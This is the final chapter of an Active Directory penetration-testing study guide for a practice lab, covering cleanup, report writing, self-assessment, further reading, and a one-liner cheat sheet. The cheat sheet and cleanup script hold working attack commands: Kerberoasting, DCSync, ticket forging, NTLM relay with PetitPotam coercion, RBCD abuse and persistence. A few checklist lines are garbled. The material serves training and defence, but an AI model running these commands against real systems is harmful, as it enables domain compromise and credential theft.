| Shadow cred on Administrator | `certipy shadow remove` with -device-id |
| WMI subscription | Remove-WmiObject __EventFilter |
| Scheduled task | `schtasks /delete /tn ...` |
| GPO startup script | Edit GPO, remove the added script line |
| Service install | `sc.exe delete <name>` |
| Skeleton key on dc01 | reboot dc01 |
| Golden ticket cache files | shred -u from your attacker host (cleanup on your side, not target) |

For unauthorised activity in a lab you own, cleanup is optional but a good habit — re-runs against a clean slate exercise the techniques better.

### Cleanup script template

```bash
#!/bin/bash
# cleanup-corp.sh
set -e
PASS='DVADlab2024!'
ADMIN_NT='<original admin NT before reset, hopefully>'

# 1. Remove computer accounts
bloodyAD --host 10.10.0.10 -d corp.local -u Administrator -H $ADMIN_NT remove computer 'evil$' || true
bloodyAD --host 10.10.0.10 -d corp.local -u Administrator -H $ADMIN_NT remove computer 'attacker$' || true

# 2. Remove RBCD configurations
bloodyAD ... remove rbcd 'dc01$' 'evil$' || true

# 3. Restore sync_user password if you changed it
# (only if you saved the original — otherwise leave it)

# 4. Remove AdminSDHolder ACE
impacket-dacledit -action 'remove' -principal alice \
    -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
    'corp.local/Administrator@10.10.0.10' -hashes :$ADMIN_NT

# 5. Remove shadow creds
# (need device IDs saved from setup)

# 6. Reboot DCs to clear skeleton key
# (not scripted — manual)

echo "Cleanup complete. Re-run BloodHound and audit ACL/sIDHistory drift."
```

---

## 14.14 Report-writing

The deliverable from a real engagement is the report, not the shells. Structure:

### Executive summary (1 page)

- **Scope:** what you tested.
- **Result:** "full forest compromise in <N hours>."
- **Top three findings** in business terms.
- **Top three recommendations.**

### Methodology (1 page)

- Tooling used.
- Recon → access → escalation → persistence → cross-forest phases.

### Findings (the bulk — one per chain)

For each significant finding:

1. **Title** — descriptive, e.g., "Kerberoastable service account with weak password yields Domain Admin."
2. **Severity** — Critical / High / Medium / Low (use CVSS or your firm's scale).
3. **Affected systems.**
4. **Description** — what's wrong, in business + technical detail.
5. **Reproduction** — the exact commands.
6. **Impact** — what an attacker can do.
7. **Recommendation** — how to fix, prioritised.
8. **References** — CVE, ATT&CK, vendor docs.

### Appendix

- Full timeline of activity (your `00-timeline.md`).
- Flag list captured.
- Tooling versions.
- Raw artefacts (in a separate encrypted ZIP).

### Sample finding skeleton

```markdown
# Finding F-007: Kerberoastable Service Account With Weak Password

**Severity:** Critical
**Affected:** corp.local Active Directory (svc_sql)
**ATT&CK:** T1558.003 — Kerberoasting

## Description

The service account `svc_sql` has a Service Principal Name registered and a
password that is crackable from the offline TGS-REP. Any authenticated user
can request a TGS for this account, then crack the password offline.

## Reproduction

    impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \\
        -request -outputfile kerb.hash
    hashcat -m 13100 kerb.hash rockyou.txt
    # crack yields svc_sql:Summer2024!

## Impact

`svc_sql` has Domain Admin equivalent rights via membership in
"SQL Admins" → "Domain Admins". Recovery of its password yields full
domain compromise.

## Recommendation

1. Rotate `svc_sql` password to a 32-character random string.
2. Migrate the account to a Group Managed Service Account (gMSA).
3. Force `KerberosEncryptionType=AES128,AES256` and remove RC4 support.
4. Detection: alert on any 4769 with TicketEncryptionType=0x17 (RC4).

## References

- MITRE ATT&CK: T1558.003
- Microsoft KB: Group Managed Service Accounts
- Sigma rule: kerberoast_rc4_tgsrep.yml
```

---

## 14.15 Self-assessment

Run yourself through this checklist. For each yes, you know the topic; for each no, go back to the chapter.

- [ ] I can sketch the Kerberos AS-REQ → AS-REP → TGS-REQ → TGS-REP exchange byte-roughly and explain why each piece is encrypted with which key.
- [ ] Given a leaked NT hash, I can describe three ways to use it (PTH, PTK derivation no, NetNTLM no, OPK fields).
- [ ] I can list five UAC flags from memory and what each enables.
- [ ] I can name and explain seven of ESC1–ESC16 without looking.
- [ ] I can write the LDAP filter for Kerberoastable users from memory.
- [ ] I can explain why the RBCD chain needs MachineAccountQuota > 0 and what specifically it grants.
- [ ] I can list the two ACE GUIDs that grant DCSync.
- [ ] I can name the PAC signature fields and explain what a Sapphire ticket changes vs Golden.
- [ ] I can list six lateral-movement primitives and their event ID signatures.
- [ ] I can explain why the forest, not the domain, is the security boundary.
- [ ] I can describe at least three persistence techniques that survive a krbtgt rotation.
- [ ] I can write a Sigma-style detection for Kerberoasting, DCSync, and Golden Ticket.
- [ ] I can explain the difference between unconstrained, constrained, and resource-based constrained delegation.
- [ ] I can describe what `EDITF_ATTRIBUTESUBJECTALTNAME2` does and why ESC6 needs it.
- [ ] I can name the four coercion families and the RPC interface each uses.
- [ ] I can describe what `StrongCertificateBindingEnforcement=2` actually changes about cert auth.
- [ ] I can list the three flags in trustAttributes that determine SID-filter behavior.
- [ ] I can explain why a Diamond ticket has a real 4768 but a Golden does not.
- [ ] I can list two ways to escape LSA Protection on a Tier-0 host.
- [ ] I can name three classes of DPAPI material and the master key needed for each.

---

## 14.16 What to read next

- **The Hacker Recipes** (`hackndo`) — Charlie Bromberg's living reference. Bookmark it.
- **ADSecurity.org** — Sean Metcalf's blog. Two decades of AD security.
- **SpecterOps** — harmj0y, _wald0, CptJesus — the BloodHound team's research blog.
- **MS-* protocol specs** — when you really need to know how the byte goes, the open specs are the source of truth. Start with MS-KILE, MS-PAC, MS-NRPC, MS-LSAD, MS-DRSR.
- **CVE-* for AD** — read every AD CVE for the last five years. You will recognise patterns.
- **Will Schroeder's posts** on harmj0y.net — the AD cert paper, RBCD paper, S4U paper.
- **Microsoft Security Response Center** — patch notes are dense but worth parsing.
- **Books:** "Active Directory: Designing, Deploying, and Running Active Directory" (Desmond et al.) for the legitimate-admin perspective; "The Hacker Playbook 3" for red-team workflow.

After DVAD: HackTheBox Pro Labs (Offshore, RastaLabs, APTLabs, Cybernetics), Game-Of-Active-Directory (Orange Cyberdefense's free version), OffSec OSEP/OSCP+, SpecterOps Red Team Ops 1 & 2, Zero-Point Security Certified Red Team Operator, SANS SEC560/660.

For defenders specifically:
- **Microsoft — Best Practices for Securing Active Directory** (the "PtH paper").
- **PingCastle** — free AD assessment.
- **BloodHound CE** — defenders use it too.
- **Defender for Identity documentation** — the canonical detection list.
- **Sysmon Modular** by Olaf Hartong.

---

## 14.17 Closing

Active Directory is 26 years of layered protocols, defaults that assume a trusted LAN, and operational accommodations for software older than most of its admins. Every "vulnerability" we exploited is some combination of:

- A protocol behaving exactly as designed (Kerberoasting, AS-REP roasting, DCSync).
- A default that made sense in 1999 (LLMNR, NTLM, unconstrained delegation).
- An admin who clicked through a wizard (vulnerable cert templates, weak ACLs, unprotected SYSVOL).
- A bug Microsoft has since patched, but environments haven't deployed (ZeroLogon, noPac, Certifried).

The defender's job is to know all of this and methodically close it. The attacker's job is to know all of this and find what they missed.

You now have the ground truth.

### Why this matters beyond a lab

DVAD is a synthetic environment. Real enterprises look messier:

- Multiple acquired domains glued together with crusty forest trusts.
- Legacy applications that demand NTLM and RC4 forever.
- Help-desk processes that share credentials across tiers.
- Admins who log into workstations with their Tier-0 account.
- Cert templates published 12 years ago and never reviewed.
- SCCM/WSUS/MFP printers/legacy SQL all with default service accounts.

A red-team operator who has finished DVAD has the *pattern recognition* for these messes — recognising "ESC1" in a misconfigured template they've never seen before, recognising "SeImpersonate + JuicyPotato" on a SQL server they've never logged into before, recognising "MAQ ≠ 0 + writable computer = RBCD" in seconds.

A blue-team analyst who has finished DVAD has the *adversary model* — they know what their attackers' day looks like and can build detections that match the muscle memory of attackers, not the textbook.

The book ends but the work doesn't. AD security is a continuous race between Microsoft's patching cadence, the customer's deployment lag, the attacker's research velocity, and the defender's instrumentation. You're now a participant.

---

**You finished the study series.** Capture the meta-flag if DVAD ships one — typically `C:\Flags\CAPSTONE.txt` on the forest root DC.

```bash
nxc smb dc01.root.corp -u Administrator -H <root_admin_NT> -x 'type C:\Flags\CAPSTONE.txt'
```

```
+-------------------------------------------------------+
|  Congratulations.                                     |
|  You owned three forests. Now go defend one.          |
+-------------------------------------------------------+
```

---

## 14.18 Appendix — One-liner cheat sheet

For quick reference when your fingers stop remembering:

```bash
# DNS / SRV
dig @<dc> _ldap._tcp.dc._msdcs.<domain> SRV

# Anonymous LDAP user enum
ldapsearch -x -H ldap://<dc> -b 'DC=<x>,DC=<y>' '(objectClass=user)' samAccountName

# Anonymous SMB null + RID
nxc smb <dc> -u '' -p '' --rid-brute 5000

# Responder
sudo responder -I <iface> -wrf

# AS-REP roast
impacket-GetNPUsers <dom>/ -no-pass -usersfile users.txt -dc-ip <dc> -format hashcat

# Kerberoast
impacket-GetUserSPNs <dom>/<user>:'<pw>' -dc-ip <dc> -request

# DCSync
impacket-secretsdump <dom>/<user>:'<pw>'@<dc> -just-dc

# Pass-the-hash
nxc smb <host> -u <user> -H <NT>
impacket-psexec -hashes :<NT> <dom>/<user>@<host>

# Pass-the-ticket
export KRB5CCNAME=<ccache>; impacket-psexec -k -no-pass <dom>/<user>@<host>

# Golden Ticket
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain <dom> Administrator

# Silver Ticket
impacket-ticketer -nthash <svc_NT> -domain-sid <SID> -domain <dom> -spn <SPN> Administrator

# ESC1 cert
certipy req -u <user>@<dom> -p '<pw>' -target <ca> -ca <CA> -template <vuln_tpl> -upn Administrator@<dom>

# ESC8 chain (relay PetitPotam to ADCS HTTP)
sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
python3 PetitPotam.py -d <dom> -u <user> -p '<pw>' <attacker> <dc>

# RBCD chain
impacket-addcomputer 'evil$' -computer-pass 'A!1' '<dom>/<user>:<pw>' -dc-host <dc>
bloodyAD --host <dc> -d <dom> -u <user> -p '<pw>' set rbcd '<victim$>' 'evil$'
impacket-getST -spn 'cifs/<victim>' -impersonate Administrator -dc-ip <dc> '<dom>/evil$:A!1'

# Shadow credentials
certipy shadow auto -u <user>@<dom> -p '<pw>' -dc-ip <dc> -account '<target>'

# BloodHound
bloodhound-python -d <dom> -u <user> -p '<pw>' -ns <dc> -c All --zip

# LDAP dump
ldapdomaindump -u '<dom>\<user>' -p '<pw>' <dc>

# Cross-forest TGS (after Golden + ExtraSid)
impacket-getST -k -no-pass -spn 'cifs/<remote_dc>' -dc-ip <remote_dc> '<dom>/Administrator'

# Trust key dump
impacket-secretsdump -just-dc '<dom>/Administrator:<pw>'@<dc> | grep -i '<trust_partner>'

# Persistence: AdminSDHolder ACE
impacket-dacledit -action write -rights FullControl -principal <user> \
    -target-dn 'CN=AdminSDHolder,CN=System,DC=<x>,DC=<y>' '<dom>/Administrator@<dc>' -hashes :<NT>
```

Print and stick on the wall.

---

## 14.19 Final words

If you got this far, you didn't just complete a lab — you built the conceptual model that lets you walk into *any* AD environment and see it the way both attackers and defenders see it. Three things will keep that model sharp:

1. **Repeat against new labs.** Every lab has a quirk DVAD doesn't. Game-Of-Active-Directory, HTB Pro Labs, Vulnlab AD chains.
2. **Read the protocol specs.** Once a quarter, pick a `[MS-*]` spec you haven't read and read it. Pattern: read the security considerations section first; it's where attackers get ideas.
3. **Write detections.** Every attack you learn, write a Sigma or KQL for it. That's how you move from "I know how this works" to "I could catch this."

Now go.

```
+-----------------------------------+
|  Fin.                             |
+-----------------------------------+
```
